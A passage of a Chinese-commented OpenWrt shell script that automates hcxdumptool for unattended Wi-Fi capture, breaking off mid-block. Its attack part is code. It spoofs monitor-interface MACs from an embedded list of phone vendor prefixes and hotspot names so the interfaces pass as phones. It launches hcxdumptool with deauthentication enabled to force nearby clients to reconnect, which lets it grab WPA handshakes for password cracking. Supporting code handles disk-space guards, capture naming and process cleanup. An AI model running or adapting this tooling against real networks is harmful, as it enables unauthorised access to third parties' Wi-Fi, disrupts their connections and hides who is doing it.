# 空间守卫阈值解析: auto -> 1 个擦除块(MIN_FREE_LEBS 个), 并做下限 32KB / 封顶"当前剩余的 20%"
if [ "${SPACE_ON}" = "1" ]
then
    case "${MIN_FREE_KB}" in
        auto)
            _lebk=$(leb_kb)
            if [ -n "${_lebk}" ]; then
                MIN_FREE_KB=$(( _lebk * MIN_FREE_LEBS ))
                SPACE_SRC="设备擦除块(LEB) ${_lebk}KB x ${MIN_FREE_LEBS}"
            else
                MIN_FREE_KB=32
                SPACE_SRC="取不到擦除块, 退回固定 32KB"
            fi
            _spcap=$(free_kb)
            case "${_spcap}" in
                ''|*[!0-9]*) ;;
                *) _spcap=$(( _spcap / 5 ))
                   if [ "${_spcap}" -ge 32 ] && [ "${MIN_FREE_KB}" -gt "${_spcap}" ]; then
                       MIN_FREE_KB="${_spcap}"
                       SPACE_SRC="${SPACE_SRC} (按当前剩余 20% 封顶)"
                   fi ;;
            esac
            if [ "${MIN_FREE_KB}" -lt 32 ]; then
                MIN_FREE_KB=32
                SPACE_SRC="${SPACE_SRC} (下限 32KB)"
            fi
            ;;
        *) SPACE_SRC="用户指定" ;;
    esac
fi

# 空间守卫启动自检: 剩余空间本来就低于阈值就别开始抓了(此时还没建接口/起进程, 直接退)
if [ "${SPACE_ON}" = "1" ]
then
    _fk0=$(free_kb)
    case "${_fk0}" in
        ''|*[!0-9]*) ;;        # 读不到就当不知道, 交给运行中的检查
        *) if [ "${_fk0}" -le "${MIN_FREE_KB}" ]
           then
               log "${red}空间守卫: ${CAP_DIR} 只剩 ${_fk0}KB < 阈值 ${MIN_FREE_KB}KB, 不启动抓包${none}"
               log "${yellow}建议: 先导出并清掉 ${CAP_DIR} 里的 pcapng / run_*.log, 或用 MIN_FREE_KB=off 关闭本守卫${none}"
               # 自检出口也写"退出原因/退出码", 与其余收尾出口保持同一套排障文案
               # (此处 log_exit_reason 尚未定义, 直接照它的格式打)
               log "${yellow}退出原因: 空间守卫启动自检未通过(启动时剩余空间已不足), 退出码 132${none}"
               log "${yellow}退出码: 132${none}"
               exit 132
           fi ;;
    esac
fi

#MAC地址文本的函数
# MAC地址字典路径 (优先保存在 CAP_DIR, 兼容既有 /etc/config/scp/mac.txt)
MAC_FILE="${CAP_DIR}/mac.txt"
[ ! -f "${MAC_FILE}" ] && [ -f "/etc/config/scp/mac.txt" ] && MAC_FILE="/etc/config/scp/mac.txt"

#MAC地址文本的函数
mac_addr() {
    mkdir -p "${CAP_DIR}" 2>/dev/null
    MAC_FILE="${CAP_DIR}/mac.txt"
cat > "${MAC_FILE}" << "EOF"
vivo-S1@48:87:64
Galaxy-S10@60:f1:89
HUAWEI_Mate_9@30:74:96
Galaxy-S20@60:f1:89
vivo-X50-Pro@06:27:C0
HUAWEI_nova_3i@f8:c3:9e
vivo-Y7s@2C:FF:EE
Android-TV@f8:4f:ad
OPPO-Reno@C4:E3:9F
vivo-X50@82:41:C2
Homor_8@A4:CA:A0
iPhone@54:33:cb
OPPO-R11@4C:18:9A
nova_5_Pro@d4:62:ea
OPPO-Reno4-5G@B0:B5:C3
HUAWEI_nova@88:44:77
OPPO-Reno@44:AE:AB
iPhone-7@7C:50:49
HUAWEI-Mate-8@94:FE:22
iPhone@E4:B2:FB
Redmi-Note-5A@04:B1:67
honor-8X-Max@34:12:F9
HUAWEI-P10-Plus@70:8A:09
HUAWEI-9plus@0C:B5:27
HUAWEI-9plus@F8:C3:9E
xiaodu-home1C@88:DA:33
HUAWEI-P30@24:DA:33
HUAWEI-10Plus@D4:62:EA
HUAWEI-Mate-9@F0:C8:50
Honer-8C@68:A0:3E
HUAWEI-nova7-5G@42:EC:71
HUAWEI-Mate-20@B4:86:55
vivo-x21@28:31:66
HUAWEI-Mate-30@C2:79:49
HUAWEI-P30@14:3C:C3
HUAWEI-P20-Pro@F0:0F:EC
OPPO-A93-5G@9C:93:8F
OPPO-A93-5G@0C:93:8F
vivo-X30@20:31:1C
vivo-Y83@3C:A5:81
vivo-Y75A@70:47:E9
vivo_Y7s@F8:E7:A0
vivo_Y9s@3C:86:D1
HONOR-9X@54:92:09
vivo-Y5s@64:2C:0F
HUAWEI_P10@20:54:FA
OPPO_R11@94:D0:29
HUAWEI_P30_Pro@D4:62:EA
HUAWEI_nova_7_Pro_5G@F2:DD:0D
vivo_X30@BE:7B:92
iPhone-x@D8:8F:76
HUAWEI_nova_7_SE_5G@D6:27:26
iPhone-x@72:59:C9
OPPO_Reno3_Pro_5G@B4:A5:AC
HUAWEI_nova_5_Pro@AC:E3:42
iPhone-x@F6:75:25
nova_5_Pro@30:A2:C2
vivo-S1@9A:D9:8C
vivo-Y85@88:F7:BF
HUAWEI-nova-6-SE@BA:AE:D7
HUAWEI-nova-7-SE-5G@1A:25:79
HUAWEI-nova-7-SE-5G@62:BB:2A
HUAWEI-nova-2s@6C:B7:49
HUAWEI-nova-5-Pro@44:D7:91
HUAWEI-P40@32:2A:7D
vivo-Z6@8E:13:A4
vivo-Y83A@20:F7:7C
EOF
}

# 辅助: 生成 3 字节随机十六进制后缀 (如 ":3a:7f:12"), 不强依赖 hexdump
rand_mac_suffix() {
    _sfx=""
    if command -v hexdump >/dev/null 2>&1; then
        _sfx=$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom 2>/dev/null)
    elif command -v od >/dev/null 2>&1; then
        _sfx=$(od -An -tx1 -N3 /dev/urandom 2>/dev/null | awk '{for(i=1;i<=NF;i++) printf ":%s", $i}')
    fi
    if [ -z "${_sfx}" ]; then
        # POSIX ash 原生伪随机兜底 (传入时间与 PID 混合种子, 杜绝同秒种子碰撞)
        _seed="$$$(date '+%s' 2>/dev/null)"
        _r1=$(awk -v s="${_seed}" 'BEGIN{srand(s); printf "%02x:%02x:%02x", rand()*255, rand()*255, rand()*255}')
        _sfx=":${_r1}"
    fi
    printf '%s' "${_sfx}"
}

#随机取一个热点名并拼出完整随机MAC (用 awk srand 一步均匀取行号, 兼容 R6220 无 $RANDOM 的 busybox ash)
#补格式兜底重试: 行格式异常时先提示再重试取行, 上限100次, 仍失败才明确报错退出
mac_name() {
    [ ! -e "${MAC_FILE}" ] && mac_addr
    get_random_num=$(wc -l < "${MAC_FILE}" 2>/dev/null)
    case "${get_random_num}" in
        ''|*[!0-9]*|0)
            log "${red}mac地址列表为空, 请检查列表${none}" && exit 1 ;;
    esac
    num=1
    while true
    do
        mac_line=$(awk -v n="${get_random_num}" 'BEGIN{srand();print int(rand()*1000000%n)+1}')
        host_name=$(sed -n "${mac_line}p" "${MAC_FILE}" | cut -d '@' -f 1 | sed -n "1p")
        _pfx=$(sed -n "${mac_line}p" "${MAC_FILE}" | cut -d '@' -f 2)
        wlan_mac="${_pfx}$(rand_mac_suffix)"
        # 格式兜底: POSIX 字符串长度判断 ${#wlan_mac} (取代非标准 wc -L, 杜绝 busybox 报 invalid option)
        if [ -n "${host_name}" ] && [ -n "${wlan_mac}" ] && [ "${#wlan_mac}" -eq 17 ]
        then
            break
        fi
        log "${yellow}mac地址列表第 ${mac_line} 行格式异常(应为: 热点名@xx:xx:xx 8位前缀), 重试取行...${none}"
        if [ "${num}" -ge 100 ]
        then
            log "${red}重试100次仍失败, 请检查 ${MAC_FILE} 格式${none}" && exit 1
        fi
        num=$((num + 1))
    done
}

# 首次运行兜底: 生成 mac 地址列表
[ ! -e "${MAC_FILE}" ] && mac_addr

#检测哪些 radio 空闲(无已启用接口 且 无运行中的网卡)
detect_idle_radios() {
    IDLE_RADIOS=
    BUSY_RADIOS=
    RADIO_COUNT=$(uci show wireless 2>/dev/null | grep -c '=wifi-device')
    if [ "${RADIO_COUNT}" = "0" ]
    then
        log "${red}/etc/config/wireless 中没有找到任何射频(wifi-device), 请先确认无线已配置${none}"
        exit 1
    fi
    for r in $(uci show wireless | grep '=wifi-device' | sed 's/wireless\.//; s/=.*//')
    do
        idx=${r#radio}
        # 动态解析 radio 对应的真实底层内核 phy (优先 uci .phy, 次选根据 .path 比对 sysfs, 彻底修复双频卡错配)
        _real_phy=$(ubus -S -t 2 call iwinfo phyname "{\"section\":\"${r}\"}" 2>/dev/null | jsonfilter -e '@.phyname' 2>/dev/null)
        _configured_phy=$(uci get wireless.${r}.phy 2>/dev/null)
        if [ -n "${_real_phy}" ] && [ -n "${_configured_phy}" ] && [ "${_real_phy}" != "${_configured_phy}" ]; then
            log "Cannot confirm physical radio for ${r}: conflicting identities; skipped"
            continue
        fi
        [ -n "${_real_phy}" ] || _real_phy="${_configured_phy}"
        if [ -z "${_real_phy}" ]; then
            _dev_path=$(uci get wireless.${r}.path 2>/dev/null)
            _matches=0
            if [ -n "${_dev_path}" ]; then
                for _p in /sys/class/ieee80211/phy*; do
                    [ -d "${_p}" ] || continue
                    _target=$(readlink -f "${_p}/device" 2>/dev/null)
                    case "${_target}" in
                        */"${_dev_path}") _real_phy=$(basename "${_p}"); _matches=$((_matches + 1)) ;;
                    esac
                done
            fi
            [ "${_matches}" = 1 ] || _real_phy=""
        fi
        case "${_real_phy}" in
            phy*) _phy_number=${_real_phy#phy} ;;
            *) _phy_number="" ;;
        esac
        case "${_phy_number}" in
            ''|*[!0-9]*) log "Cannot confirm physical radio for ${r}; skipped"; continue ;;
        esac
        [ -d "/sys/class/ieee80211/${_real_phy}" ] || continue
        eval "PHY_${r}=\"${_real_phy}\""

        # 优先检测 radio 自身是否被整体禁用(如 LuCI 中关闭该频段): 整卡禁用直接视为空闲
        _dev_disabled=$(uci get wireless.${r}.disabled 2>/dev/null)
        if [ "${_dev_disabled}" = "1" ]
        then
            IDLE_RADIOS="${IDLE_RADIOS} ${r}"
            continue
        fi

        busy=0
        for sec in $(uci show wireless | grep '=wifi-iface' | sed 's/wireless\.//; s/=.*//')
        do
            [ "$(uci get wireless.${sec}.device 2>/dev/null)" = "${r}" ] || continue
            [ "$(uci get wireless.${sec}.disabled 2>/dev/null)" = "1" ] && continue
            busy=1
            break
        done
        if [ "${busy}" = "0" ]
        then
            for d in $(ls /sys/class/net 2>/dev/null)
            do
                case "${d}" in
                    ${_real_phy}-*)       busy=1; break ;;
                    hcxmon${idx}|hcxmon${idx}-*)     busy=1; break ;;
                esac
            done
        fi
        if [ "${busy}" = "1" ]
        then
            BUSY_RADIOS="${BUSY_RADIOS} ${r}"
        else
            IDLE_RADIOS="${IDLE_RADIOS} ${r}"
        fi
    done
}

#TERM 后宽限轮询: 每 GRACE_POLL_SECS 秒检查一次, 传入的进程全部退出则提前返回
all_dead() {
    for p in "$@"
    do
        kill -0 "${p}" 2>/dev/null && return 1   # 任何一个还活着 -> 未全部退出
    done
    return 0
}
finish_with_grace() {
    if [ "$#" -eq "0" ]
    then
        return 0
    fi
    if all_dead "$@"
    then
        return 0
    fi
    round=0
    while [ "${round}" -lt "${GRACE_MAX_POLLS}" ]
    do
        sleep "${GRACE_POLL_SECS}"
        if all_dead "$@"
        then
            return 0
        fi
        round=$((round + 1))
    done
    for p in "$@"
    do
        kill -0 "${p}" 2>/dev/null && kill -9 "${p}" >/dev/null 2>&1
    done
}

#智能残留处理: 外部抓包进程(无 hcxmon 接口)拒绝启动; 本脚本崩溃遗留则回收
sweep_stale_ifaces() {
    HCX_CNT=$(ps w 2>/dev/null | grep 'hcxdumptool -i' | grep -cv grep)
    MON_CNT=$(ls /sys/class/net 2>/dev/null | grep -c '^hcxmon')
    if [ "${HCX_CNT}" -gt 0 ] && [ "${MON_CNT}" -eq 0 ]
    then
        log "${red}检测到外部 hcxdumptool 进程正在运行(非本脚本创建), 为避免冲突请先停止它${none}"
        exit 1
    fi
    if [ "${HCX_CNT}" -gt 0 ]
    then
        log "${yellow}发现上次未正常退出遗留的抓包进程, 正在回收...${none}"
        STALE_PIDS=$(ps w 2>/dev/null | grep 'hcxdumptool' | grep 'hcxmon' | grep -v grep | awk '{print $1}')
        for pid in ${STALE_PIDS}
        do
            kill -TERM "${pid}" >/dev/null 2>&1
        done
        finish_with_grace ${STALE_PIDS}
    fi
    for d in $(ls /sys/class/net 2>/dev/null)
    do
        case "${d}" in
            hcxmon*|hcxstub*)
                iw dev "${d}" del >/dev/null 2>&1 \
                    && log "${yellow}已清理残留的监听接口: ${d}${none}"
                ;;
        esac
    done
    # 清理上次遗留的日志文件
    for stale_log in ${CAP_DIR}/run_hcxmon_*.log ${CAP_DIR}/run_hcxmon[0-9]*.log
    do
        [ -e "${stale_log}" ] && rm -f "${stale_log}" 2>/dev/null
    done 2>/dev/null
}

#在空闲 radio 上用 iw 直接创建原始监听接口(不写任何配置文件)
create_raw_monitor() {
    r="$1"
    idx=${r#radio}
    eval "_use_phy=\$PHY_${r}"
    [ -n "${_use_phy}" ] && [ -d "/sys/class/ieee80211/${_use_phy}" ] || return 1
    _phy_idx=${_use_phy#phy}
    band=$(uci get wireless.${r}.band 2>/dev/null)
    [ -z "${band}" ] && band=$(uci get wireless.${r}.hwmode 2>/dev/null)
    mac_name
    name="hcxmon${idx}"
    # 清理该空闲射频上残留的旧接口(防止 AP 接口锁定信道导致 hcxdumptool 报 failed to arm interface)
    for _stale in $(iw dev 2>/dev/null | grep -E "phy#${_phy_idx}\b" -A 10 | grep 'Interface ' | awk '{print $2}')
    do
        case "${_stale}" in
            hcxmon*|hcxstub*|${name}) : ;;
            *) iw dev "${_stale}" del >/dev/null 2>&1 ;;
        esac
    done
    # [日志加固] 捕获真实报错打进会话日志
    _err=$( { iw ${_use_phy} interface add ${name} type monitor addr ${wlan_mac} \
        && ip link set ${name} up; } 2>&1 )
    if [ "$?" = "0" ]
    then
        CREATED_IFS="${CREATED_IFS} ${name}"
        # 归一化并缓存频段名称 (全量覆盖 OpenWrt 历史 hwmode/band 取值, 消除 5G 误判)
        case "${band}" in
            *5g*|*5G*|*11a*|*11ac*|*11ax_5g*|*5ghz*|*5GHz*|a|ac)
                _norm_band="5G" ;;
            *2g*|*2G*|*11g*|*11b*|*11ng*|*11n*|*2ghz*|*2GHz*|b|g)
                _norm_band="2.4G" ;;
            *6g*|*6G*|*6ghz*|*6GHz*)
                _norm_band="6G" ;;
            *)
                # 底层内核 iw info 探测真实频段兜底
                if iw phy "${_use_phy}" info 2>/dev/null | grep -q "Band 2:"; then
                    _norm_band="5G"
                elif iw phy "${_use_phy}" info 2>/dev/null | grep -q "Band 1:"; then
                    _norm_band="2.4G"
                else
                    _norm_band="未知频段"
                fi
                ;;
        esac
        eval "BAND_${name}=\"${_norm_band}\""
        eval "BAND_RAW_${name}=\"${band}\""
        log "${cyan}已创建: ${r}(${_use_phy}/${_norm_band}) -> 接口[${name}] 随机MAC[${wlan_mac}] 热点名[${host_name}]${none}"
    else
        iw dev ${name} del >/dev/null 2>&1
        log "${red}${r}(${_use_phy}) 创建监听接口失败, 已跳过该射频${none}"
        log "${red}  失败原因: ${_err:-无输出(命令被静默拒绝)}${none}"
    fi
    sleep 1
}

# ---------------- 命名: hcxmon_radio<idx>_<4位补零序号>.pcapng ----------------
# 按接口/射频维护独立序号, 不依赖系统时间。每个射频从 cap 目录里已有"该射频前缀"
# 的最大序号继续 +1(4位补零 0001/0002/...), 重启多少次都不撞名、不覆盖旧包。
# [FIX] 先脱前导零再算术: busybox ash 的 $(( )) 把 "0008" 当非法八进制, 致命。
next_cap_file() {
    iface="$1"
    idx=${iface#hcxmon}
    prefix="hcxmon_radio${idx}"
    max=0
    for f in ${CAP_DIR}/${prefix}_*.pcapng
    do
        [ -e "${f}" ] || continue
        num=$(basename "${f}" | sed -n "s/^${prefix}_\([0-9][0-9]*\)\.pcapng$/\1/p")
        [ -n "${num}" ] || continue
        nums=$(printf '%s' "${num}" | sed 's/^0*//')
        [ -n "${nums}" ] || nums=0
        if [ "${nums}" -gt "${max}" ]
        then
            max="${nums}"
        fi
    done
    max=$((max+1))
    seq4=$(printf '%04d' "${max}" 2>/dev/null)
    [ -n "${seq4}" ] || seq4="${max}"
    printf '%s/%s_%s.pcapng' "${CAP_DIR}" "${prefix}" "${seq4}"
}

#启动一路 hcxdumptool: 按当前方言 + 该接口频段拼命令行, 命令行写进该路 run_*.log 首行
# (日志自描述, 排障直接对上参数); 启动成功把 PID 放进 HCX_LAST_PID
hcx_launch() {
    drv="$1"
    out="$2"
    lf="$3"
    eval "bd=\$BAND_${drv}"

    # 命令行形态由阶梯决定: full=全参 / reduced=去可选参数(legacy 去 -c, new 兜底降参)
    case "${HCX_MODE}" in
        new)
            # 拔除假信标广播，全程启用受控 Deauth 强制重连诱导:
            # 允许单播向活跃终端定向轻敲触发重连以秒级捕获四次握手，同时严格封死假信标广播与假探针骚扰
            _active_opts="--attemptapmax=${ATTEMPT_AP_MAX} --attemptclientmax=${ATTEMPT_CLIENT_MAX} --disable_beacon --disable_proberequest"
            _bpf_opt=""
            _bpf_tag=""
            if [ "${_has_bpf}" = "1" ] && [ -f "${BPF_FILE}" ] && [ "${HCX_VARIANT}" != "reduced" ]
            then
                _bpf_opt="--bpf=${BPF_FILE}"
                _bpf_tag="/纯净BPF过滤"
            fi
            case "${bd}" in
                2.4G) _chs_new="${CH_2G_NEW}" ; _btag="2.4G(1-13)" ; _ch_range="跳频中 (1-13)" ;;
                5G)   _chs_new="${CH_5G_NEW}" ; _btag="5G(DFS-free)" ; _ch_range="跳频中 (36-165)" ;;
                6G)   _chs_new="${CH_6G_NEW}" ; _btag="6G(PSC-preferred)" ; _ch_range="跳频中 (5-117)" ;;
                *)    _chs_new=""             ; _btag="未知频段" ; _ch_range="跳频中 (全信道)" ;;
            esac
            case "${_chs_new}" in
                *,*) : ;;
                *[0-9]*) _ch_range="固定 (信道 ${_chs_new%[abc]})" ;;
                "") _ch_range="跳频中 (全信道)" ;;
            esac
            if [ "${HCX_VARIANT}" = "reduced" ]
            then
                if [ -n "${_chs_new}" ]
                then
                    _form="new-chan-min"
                    _vdesc="new/降级(-c ${_btag}/Deauth重连)"
                else
                    _form="new-min"
                    _vdesc="new/兜底降级(无信道表/Deauth重连)"
                    _ch_range="跳频中 (全信道)"
                fi
            else
                if [ -n "${_chs_new}" ]
                then
                    _form="new-chan"
                    _vdesc="new/双轨加速(-c ${_btag}${_bpf_tag}/Deauth重连/无假信标)"
                else
                    _form="new-full"
                    _vdesc="new/双轨加速(-F${_bpf_tag}/Deauth重连/无假信标)"
                fi
            fi
            ;;
        *)
            _bpfc_opt=""
            _bpfc_tag=""
            if [ "${_has_bpfc}" = "1" ] && [ -f "${BPF_FILE}" ] && [ "${HCX_VARIANT}" != "reduced" ]
            then
                _bpfc_opt="--bpfc=${BPF_FILE}"
                _bpfc_tag="/纯净BPF过滤"
            fi
            case "${bd}" in
                2.4G|2g) _chs="${CH_2G}" ; _btag="2.4G(1-13)" ; _ch_range="跳频中 (1-13)" ;;
                5G|5g)   _chs="${CH_5G}" ; _btag="5G(DFS-free)" ; _ch_range="跳频中 (36-165)" ;;
                6G|6g)   _chs=""         ; _btag="6G(legacy不传信道表)" ; _ch_range="跳频中 (全信道)" ;;
                *)       _chs=""         ; _btag="未知频段" ; _ch_range="跳频中 (全信道)" ;;
            esac
            # 彻底拔除 --active_beacon 假信标广播，消除空域污染；保留 Deauth 促发握手
            _flags="--enable_status=15"
            if [ "${HCX_VARIANT}" = "reduced" ]
            then
                if [ -n "${_chs}" ]
                then
                    _chs=""                      # 降参一档: 去掉 -c, 交给工具自己跳频
                    _form="legacy-nochan"
                    _vdesc="legacy/去-c(${_btag}/Deauth重连/无假信标)"
                    _ch_range="跳频中 (全信道)"
                else
                    _flags=""                    # 本来就无信道表: 再降一档, 去掉可选标志
                    _form="legacy-min"
                    _vdesc="legacy/极简(${_btag})"
                    _ch_range="跳频中 (全信道)"
                fi
            else
                if [ -n "${_chs}" ]
                then
                    _form="legacy-chan"
                    _vdesc="legacy/全参(${_btag}${_bpfc_tag}/Deauth重连/无假信标)"
                    case "${_chs}" in
                        *,*) : ;;
                        *[0-9]*) _ch_range="固定 (信道 ${_chs})" ;;
                    esac
                else
                    _form="legacy-nochan"
                    _vdesc="legacy/无信道表(${_btag}${_bpfc_tag}/Deauth重连/无假信标)"
                    _ch_range="跳频中 (全信道)"
                fi
            fi
            ;;
    esac
    eval "CH_RANGE_${drv}=\"${_ch_range}\""
    # 逐形态显式启动(刻意不用 eval: 必须让 $! 就是 hcxdumptool 本体,
    # 否则收尾时 kill 到的是中间层 shell, 真进程会变孤儿继续占着射频)
    case "${_form}" in
        new-chan)
            CMDLINE="${HCX_BIN} -i ${drv} -w ${out} -c ${_chs_new} ${_bpf_opt} ${_active_opts}"
            printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
            "${HCX_BIN}" -i "${drv}" -w "${out}" -c "${_chs_new}" ${_bpf_opt} \
                --attemptapmax="${ATTEMPT_AP_MAX}" \
                --attemptclientmax="${ATTEMPT_CLIENT_MAX}" \
                --disable_beacon \
                --disable_proberequest >> "${lf}" 2>&1 & ;;
        new-chan-min)
            CMDLINE="${HCX_BIN} -i ${drv} -w ${out} -c ${_chs_new} --disable_beacon --disable_proberequest"
            printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
            "${HCX_BIN}" -i "${drv}" -w "${out}" -c "${_chs_new}" \
                --disable_beacon \
                --disable_proberequest >> "${lf}" 2>&1 & ;;
        new-full)
            CMDLINE="${HCX_BIN} -i ${drv} -w ${out} -F ${_bpf_opt} ${_active_opts}"
            printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
            "${HCX_BIN}" -i "${drv}" -w "${out}" -F ${_bpf_opt} \
                --attemptapmax="${ATTEMPT_AP_MAX}" \
                --attemptclientmax="${ATTEMPT_CLIENT_MAX}" \
                --disable_beacon \
                --disable_proberequest >> "${lf}" 2>&1 & ;;
        new-min)
            CMDLINE="${HCX_BIN} -i ${drv} -w ${out} --disable_beacon --disable_proberequest"
            printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
            "${HCX_BIN}" -i "${drv}" -w "${out}" \
                --disable_beacon \
                --disable_proberequest >> "${lf}" 2>&1 & ;;
        legacy-chan)
            CMDLINE="${HCX_BIN} -i ${drv} -c ${_chs} -o ${out} ${_bpfc_opt} ${_flags}"
            printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
            "${HCX_BIN}" -i "${drv}" -c ${_chs} -o "${out}" ${_bpfc_opt} ${_flags} >> "${lf}" 2>&1 & ;;
        legacy-nochan)
            CMDLINE="${HCX_BIN} -i ${drv} -o ${out} ${_bpfc_opt} ${_flags}"
            printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
            "${HCX_BIN}" -i "${drv}" -o "${out}" ${_bpfc_opt} ${_flags} >> "${lf}" 2>&1 & ;;
        legacy-min)
            CMDLINE="${HCX_BIN} -i ${drv} -o ${out}"
            printf '[%s] 启动命令(形态=%s): %s\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${_vdesc}" "${CMDLINE}" >> "${lf}"
            "${HCX_BIN}" -i "${drv}" -o "${out}" >> "${lf}" 2>&1 & ;;
    esac
    HCX_LAST_PID=$!
}

#启动自检: 与 PIDS 一一对应验活, 异常退出的进程对应接口一并摘除并清理死PID
verify_captures() {
    ALIVE_IFS=
    ALIVE_PIDS=
    set -- ${CREATED_IFS}
    for p in ${PIDS}
    do
        drv="${1}"
        shift
        if [ -n "${drv}" ] && kill -0 "${p}" 2>/dev/null
        then
            ALIVE_IFS="${ALIVE_IFS} ${drv}"
            ALIVE_PIDS="${ALIVE_PIDS} ${p}"
        elif [ -n "${drv}" ]
        then
            log "${red}${drv} 的抓包进程未能运行, 已移除该接口${none}"
            iw dev ${drv} del >/dev/null 2>&1
        fi
    done
    CREATED_IFS="${ALIVE_IFS# }"
    PIDS="${ALIVE_PIDS# }"
}

# 方言猜错时, 本轮失败留下的 0 字节 pcapng 清掉, 免得干扰下次(序号也不会白跳一格)
purge_empty_captures() {
    for f in ${OUT_FILES}
    do
        if [ -f "${f}" ]
        then
            _sz=$(wc -c < "${f}" 2>/dev/null)
            if [ "${_sz:-0}" = "0" ]
            then
                rm -f "${f}" 2>/dev/null
                log "${yellow}已清掉本轮失败留下的空文件: ${f}${none}"
            fi
        fi
    done
}

# 尝试阶梯: 进到下一档并设置 HCX_MODE / HCX_VARIANT; 阶梯走完返回 1
#   第1档 首选方言+全参 | 第2档 另一种方言+全参 | 第3档 首选方言+降参
# 脚本可能被设成开机自启、无人值守 —— 没人在旁边看清楚后手动重跑,
# 所以宁可多试两档(每档都留完整命令行与工具原文)也不要一次就放弃。
next_attempt() {
    while :
    do
        HCX_ATTEMPT=$((HCX_ATTEMPT + 1))
        if [ "${HCX_PRIMARY}" = "new" ]
        then
            case "${HCX_ATTEMPT}" in
                1) HCX_MODE="new" ; HCX_VARIANT="full" ;;
                2) HCX_MODE="new" ; HCX_VARIANT="reduced" ;;
                *) return 1 ;;
            esac
        else
            case "${HCX_ATTEMPT}" in
                1) HCX_MODE="legacy" ; HCX_VARIANT="full" ;;
                2) HCX_MODE="legacy" ; HCX_VARIANT="reduced" ;;
                *) return 1 ;;
            esac
        fi
        _tag="${HCX_MODE}-${HCX_VARIANT}"
        case " ${HCX_TRIED} " in
            *" ${_tag} "*) continue ;;
        esac
        HCX_TRIED="${HCX_TRIED} ${_tag}"
        if [ "${HCX_ATTEMPT}" -gt 1 ]
        then
            case "${HCX_VARIANT}" in
                reduced) log "${yellow}进入第 ${HCX_ATTEMPT} 档: 改用 ${HCX_MODE} 方言 + 降参(去掉可选参数)再试${none}" ;;
                *)       log "${yellow}进入第 ${HCX_ATTEMPT} 档: 改用 ${HCX_MODE} 方言再试${none}" ;;
            esac
        fi
        init_bpf_filter
        return 0
    done
}

#必要收尾(幂等): 杀本次抓包进程 + 删本次创建的监听口 + 删运行锁与临时BPF。
# 单独抽出来是为了"收尾过程中又收到信号"那条路也能跑到它 —— 否则 hcxmon*/锁 会留下,
# 射频一直被占着(下次启动虽能回收遗留进程, 但接口和锁不该留)。重复调用无副作用。
cleanup_leftovers() {
    for p in ${PIDS}
    do
        kill "${p}" >/dev/null 2>&1
    done
    if [ -n "${CREATED_IFS}" ]
    then
        for i in ${CREATED_IFS}
        do
            iw dev ${i} del >/dev/null 2>&1
        done
        CREATED_IFS=
    fi
    rm -f "${LOCK}" "${BPF_FILE}" >/dev/null 2>&1
}

#清理: 先TERM让hcxdumptool优雅收尾(补全pcapng文件尾), 再宽限轮询等它退出;
#      只杀本脚本启动的进程, 只删本次创建的接口
cleanup_capture() {
    # 退出原因: 守卫触发过收尾 -> 131/132, 人工 Ctrl-C/信号仍为 130(见 do_cleanup_exit)
    if [ -f "${GUARD_FLAG}" ]
    then
        MEMGUARD_STOPPED=1
        rm -f "${GUARD_FLAG}" >/dev/null 2>&1
    fi
    if [ -f "${SPACE_FLAG}" ]
    then
        SPACEGUARD_STOPPED=1
        rm -f "${SPACE_FLAG}" >/dev/null 2>&1
    fi
    for p in ${PIDS}
    do
        kill "${p}" >/dev/null 2>&1
    done
    finish_with_grace ${PIDS}
    # "删监听口/删锁" 那段逻辑统一集中在 cleanup_leftovers(幂等), 避免两处写法漂移
    _had_ifs="${CREATED_IFS}"
    cleanup_leftovers
    if [ -n "${_had_ifs}" ]
    then
        echo ""
        log "${yellow}已删除本次创建的监听接口, 未触碰你的任何WiFi配置${none}"
    fi
    if [ -n "${OUT_FILES}" ]
    then
        echo ""
        log "${green}本次抓包文件:${none}"
        for f in ${OUT_FILES}
        do
            # 文件不存在时先判存在, 避免 shell 漏出重定向报错(can not open)噪音
            fsz=0
            [ -f "${f}" ] && fsz=$(wc -c < "${f}" 2>/dev/null)
            log "  ${f} (${fsz:-0} B)"
        done
        log "${green}收尾明细见日志:${none}"
        for rl in ${RUNLOGS}
        do
            log "  ${rl}"
        done
    fi
    log "${green}会话日志: ${SESSION_LOG} (报障请打包整个 ${CAP_DIR}/ 发来)${none}"
}

# ========================== 主流程(0打扰模式) ==========================
# 不修改无线配置、不 reload wifi —— 只用 iw 在空闲射频上创建 hcxmon* 监听接口
# 有几个空闲射频就开几路, 退出/Ctrl-C 只删 hcxmon*

#运行锁: 同时只允许一个实例 (兼顾清理旧版残留锁)
rm -f /tmp/.hcx_v26*.lock >/dev/null 2>&1
if [ -f "${LOCK}" ]
then
    OLD_PID=$(cat "${LOCK}" 2>/dev/null)
    if [ -n "${OLD_PID}" ] && kill -0 "${OLD_PID}" 2>/dev/null
    then
        # 动态匹配自身脚本名(SCRIPT_BASE 或 SCRIPT_FILE)，同时兼容旧版 hcxdumptool
        if grep -aEq "${SCRIPT_BASE}|${SCRIPT_FILE}|hcxdumptool" /proc/${OLD_PID}/cmdline 2>/dev/null
        then
            log "${yellow}已有抓包实例(PID=${OLD_PID})正在运行, 发送TERM停止旧实例...${none}"
            kill -TERM "${OLD_PID}" 2>/dev/null
            WAIT=0
            while [ "${WAIT}" -lt 20 ]
            do
                kill -0 "${OLD_PID}" 2>/dev/null || break
                sleep 1
                WAIT=$((WAIT + 1))
            done
            if kill -0 "${OLD_PID}" 2>/dev/null
            then
                log "${red}旧实例未能响应TERM, 强制KILL-9...${none}"
                kill -9 "${OLD_PID}" 2>/dev/null
                sleep 1
            fi
        else
